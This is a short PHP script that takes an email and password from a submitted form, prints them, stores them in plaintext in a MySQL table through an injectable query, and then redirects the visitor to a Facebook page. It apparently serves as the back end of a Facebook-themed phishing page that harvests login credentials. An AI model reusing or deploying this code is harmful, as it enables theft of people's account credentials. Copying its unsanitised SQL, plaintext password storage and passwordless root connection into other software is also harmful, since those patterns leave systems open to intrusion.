<?php
$link = mysqli_connect("localhost", "root", "", "info");
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
$email= $_POST['email'];
$password = $_POST['pass'];
echo $email.$password;

$sql = "INSERT INTO `user` (`username`, `pwd`) VALUES ('$email', '$password')";


if(mysqli_query($link, $sql)){
  echo "pass";
}else{
  echo "fail";
}

//header('Location: https://m.facebook.com/ahawal.fun/'); 

header('Location: https://m.facebook.com/Chemex.lk/photos/a.2040102492901958.1073741981.1487173651528181/2041683472743860/?type=3&theater/');
?>
